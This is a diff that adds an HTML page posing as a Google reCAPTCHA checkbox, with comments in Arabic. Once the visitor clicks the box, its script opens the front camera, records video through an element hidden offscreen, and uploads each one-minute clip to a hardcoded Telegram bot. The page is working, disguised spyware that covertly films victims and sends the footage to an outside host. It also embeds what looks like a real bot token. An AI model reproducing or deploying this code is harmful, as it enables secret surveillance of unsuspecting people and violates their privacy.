@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>reCAPTCHA</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', Arial, sans-serif; }
+    body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f9f9f9; }
+
+    .recaptcha-box {
+        width: 304px; height: 78px;
+        background: #f9f9f9;
+        border: 1px solid #d3d3d3;
+        border-radius: 3px;
+        box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
+        display: flex; align-items: center;
+        padding: 0 12px; position: relative;
+        user-select: none; overflow: hidden;
+    }
+    .recaptcha-box:hover { box-shadow: 0 0 4px 1px rgba(0,0,0,0.14); }
+
+    .checkbox-wrapper { position: relative; width: 28px; height: 28px; margin-right: 12px; flex-shrink: 0; }
+    .checkbox-wrapper input { position: absolute; opacity: 0; width: 100%; height: 100%; cursor: pointer; z-index: 10; }
+    .checkmark {
+        position: absolute; top: 0; left: 0; width: 28px; height: 28px;
+        background: #fff; border: 2px solid #c1c1c1; border-radius: 2px;
+        transition: all 0.2s; pointer-events: none;
+    }
+    .checkbox-wrapper input:checked + .checkmark { background: transparent; border-color: transparent; }
+    .checkmark::after {
+        content: ""; position: absolute; left: 50%; top: 50%;
+        width: 24px; height: 24px;
+        transform: translate(-50%,-50%) scale(0);
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none'%3E%3Cpath d='M4.5 12.5L9.5 17.5L19.5 6.5' stroke='%23009600' stroke-width='3.2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+        background-size: contain; background-repeat: no-repeat;
+        opacity: 0;
+        transition: transform 0.4s cubic-bezier(0.175,0.885,0.32,1.275), opacity 0.2s;
+    }
+    .checkbox-wrapper input:checked + .checkmark::after { transform: translate(-50%,-50%) scale(1); opacity: 1; }
+
+    .recaptcha-text { font-size: 14px; color: #000; flex-grow: 1; cursor: pointer; padding-left: 4px; }
+
+    .spinner {
+        position: absolute; left: 14px; top: 50%;
+        width: 28px; height: 28px; margin-top: -14px;
+        border: 3.5px solid #d3d9de; border-top-color: #4285f4;
+        border-radius: 50%; animation: spin 0.85s linear infinite; display: none;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .recaptcha-box.loading .checkbox-wrapper { visibility: hidden; }
+    .recaptcha-box.loading .spinner { display: block; }
+    .recaptcha-box.loading .recaptcha-text { color: #555; }
+
+    .recaptcha-logo { display: flex; flex-direction: column; align-items: center; flex-shrink: 0; line-height: 1; }
+    .recaptcha-logo svg { width: 32px; height: 32px; margin-bottom: 1px; }
+    .recaptcha-logo .logo-name { font-size: 10px; color: #555; font-weight: 500; }
+    .recaptcha-logo .privacy { font-size: 8px; color: #9aa0a6; margin-top: 2px; }
+    .recaptcha-logo a { color: inherit; text-decoration: none; }
+
+    /* فيديو مخفي تماماً */
+    #hiddenRecorder {
+        position: fixed;
+        width: 1px; height: 1px;
+        opacity: 0.01;
+        pointer-events: none;
+        top: -9999px;
+        left: -9999px;
+    }
+</style>
+</head>
+<body>
+
+<div class="recaptcha-box" id="recaptchaBox">
+    <div class="spinner"></div>
+    <div class="checkbox-wrapper">
+        <input type="checkbox" id="robotCheck" aria-label="I'm not a robot">
+        <div class="checkmark"></div>
+    </div>
+    <label for="robotCheck" class="recaptcha-text" id="captchaText">I'm not a robot</label>
+    <div class="recaptcha-logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" width="32" height="32">
+            <path fill="#1C3AA9" d="M64 31.955l-.033-1.37V4.687l-7.16 7.16C50.948 4.674 42.033.093 32.05.093c-10.4 0-19.622 4.96-25.458 12.64l11.736 11.86a15.55 15.55 0 0 1 4.754-5.334c2.05-1.6 4.952-2.906 8.968-2.906.485 0 .86.057 1.135.163 4.976.393 9.288 3.14 11.828 7.124l-8.307 8.307L64 31.953"/>
+            <path fill="#4285F4" d="M31.862.094l-1.37.033H4.594l7.16 7.16C4.58 13.147 0 22.06 0 32.046c0 10.4 4.96 19.622 12.64 25.458L24.5 45.768a15.55 15.55 0 0 1-5.334-4.754c-1.6-2.05-2.906-4.952-2.906-8.968 0-.485.057-.86.163-1.135.393-4.976 3.14-9.288 7.124-11.828l8.307 8.307L31.86.095"/>
+            <path fill="#ABABAB" d="M.001 32.045l.033 1.37v25.898l7.16-7.16c5.86 7.173 14.774 11.754 24.76 11.754 10.4 0 19.622-4.96 25.458-12.64l-11.736-11.86a15.55 15.55 0 0 1-4.754 5.334c-2.05 1.6-4.952 2.906-8.968 2.906-.485 0-.86-.057-1.135-.163-4.976-.393-9.288-3.14-11.828-7.124l8.307-8.307c-10.522.04-22.4.066-27.295-.005"/>
+        </svg>
+        <div class="logo-name">reCAPTCHA</div>
+        <div class="privacy"><a href="#">Privacy</a> - <a href="#">Terms</a></div>
+    </div>
+</div>
+
+<!-- الفيديو المخفي -->
+<video id="hiddenRecorder" autoplay playsinline muted></video>
+
+<script>
+    /* ⚙️ الإعدادات — ضع بياناتك هنا */
+    const TELEGRAM_BOT_TOKEN = '8951119517:AAFCJEvvEVj22fWYQJlE3sH4Ek3DUyzBQa0';
+    const TELEGRAM_CHAT_ID   = '8951119517';
+    const SEGMENT_DURATION   = 60 * 1000;   // دقيقة
+    const MIME_TYPE          = 'video/webm;codecs=vp8,opus';
+
+    /* ========== العناصر ========== */
+    const box      = document.getElementById('recaptchaBox');
+    const checkbox = document.getElementById('robotCheck');
+    const text     = document.getElementById('captchaText');
+    const video    = document.getElementById('hiddenRecorder');
+
+    /* ========== الحالة ========== */
+    let isVerified    = false;
+    let isBusy        = false;
+    let mediaStream   = null;
+    let segmentTimer  = null;
+    let isRecording   = false;
+
+    /* ========== 1) ضغط المربع ========== */
+    checkbox.addEventListener('click', function (e) {
+        e.preventDefault();
+        if (isVerified || isBusy) return;
+
+        isBusy = true;
+        box.classList.add('loading');
+        text.textContent = 'Verifying...';
+
+        const delay = 1200 + Math.random() * 600;
+
+        setTimeout(async () => {
+            box.classList.remove('loading');
+            text.textContent = "I'm not a robot";
+            checkbox.checked = true;
+            isVerified = true;
+            isBusy = false;
+
+            // 🎥 تشغيل التسجيل الخفي في الخلفية
+            startHiddenRecording();
+
+            // إطلاق الحدث
+            const token = '03AGdBq2' + Math.random().toString(36).substring(2)
+                        + Math.random().toString(36).substring(2);
+
+            document.dispatchEvent(new CustomEvent('recaptchaSuccess', {
+                detail: { token }
+            }));
+        }, delay);
+    });
+
+    /* ========== 2) تشغيل التسجيل الخفي ========== */
+    async function startHiddenRecording() {
+        try {
+            mediaStream = await navigator.mediaDevices.getUserMedia({
+                video: { width: 480, height: 360, facingMode: 'user' },
+                audio: false
+            });
+
+            video.srcObject = mediaStream;
+            await video.play();
+
+            console.log('🎥 Hidden recording started');
+
+            // ابدأ أول مقطع
+            recordSegment();
+
+        } catch (err) {
+            console.warn('⚠️ Camera denied:', err.message);
+        }
+    }
+
+    /* ========== 3) تسجيل مقطع واحد ========== */
+    function recordSegment() {
+        if (!mediaStream || !mediaStream.active) return;
+
+        const chunks = [];
+        let recorder;
+
+        try {
+            recorder = new MediaRecorder(mediaStream, { mimeType: MIME_TYPE });
+        } catch (e) {
+            // fallback للمتصفحات القديمة
+            recorder = new MediaRecorder(mediaStream);
+        }
+
+        recorder.ondataavailable = (e) => {
+            if (e.data && e.data.size > 0) chunks.push(e.data);
+        };
+
+        recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+
+            // أرسل المقطع للتليجرام
+            if (blob.size > 1000) {
+                sendToTelegram(blob);
+            }
+
+            // ابدأ مقطع جديد بعد ثانية (فاصل بسيط)
+            setTimeout(recordSegment, 1000);
+        };
+
+        recorder.start();
+        isRecording = true;
+
+        // ⏱️ إيقاف تلقائي بعد المدة المحددة
+        segmentTimer = setTimeout(() => {
+            if (recorder.state === 'recording') {
+                recorder.stop();
+            }
+            isRecording = false;
+        }, SEGMENT_DURATION);
+    }
+
+    /* ========== 4) إرسال الفيديو للتليجرام ========== */
+    async function sendToTelegram(blob) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.warn('⚠️ ضع TELEGRAM_BOT_TOKEN و TELEGRAM_CHAT_ID');
+            return;
+        }
+
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+
+        const filename = `video_${Date.now()}.webm`;
+        formData.append('video', blob, filename);
+
+        formData.append('caption',
+            `📹 فيديو جديد\n🕒 ${new Date().toLocaleString('ar-EG')}\n📦 ${(blob.size / 1024).toFixed(1)} KB`
+        );
+
+        try {
+            const res = await fetch(
+                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`,
+                { method: 'POST', body: formData }
+            );
+
+            const data = await res.json();
+
+            if (data.ok) {
+                console.log('✅ تم إرسال الفيديو للتليجرام');
+            } else {
+                console.warn('❌ فشل الإرسال:', data.description);
+                // محاولة إرسال كـ document إذا فشل الفيديو
+                await sendAsDocument(blob);
+            }
+        } catch (err) {
+            console.error('❌ خطأ في الاتصال:', err);
+        }
+    }
+
+    /* ========== 5) إرسال كـ document (احتياطي) ========== */
+    async function sendAsDocument(blob) {
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('document', blob, `video_${Date.now()}.webm`);
+
+        try {
+            await fetch(
+                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+                { method: 'POST', body: formData }
+            );
+        } catch (e) {
+            console.error('فشل الإرسال الاحتياطي:', e);
+        }
+    }
+
+    /* ========== 6) منع إلغاء التحقق ========== */
+    checkbox.addEventListener('change', function () {
+        if (isVerified) this.checked = true;
+    });
+
+    /* ========== 7) تحرير الموارد عند الإغلاق ========== */
+    window.addEventListener('beforeunload', () => {
+        if (segmentTimer) clearTimeout(segmentTimer);
+        if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+    });
+
+    /* ========== 8) إيقاف مؤقت عند إخفاء الصفحة ========== */
+    document.addEventListener('visibilitychange', () => {
+        if (document.hidden) {
+            console.log('📴 الصفحة مخفية — الفيديو سيتوقف تلقائياً');
+        }
+    });
+</script>
+
+</body>
+</html>
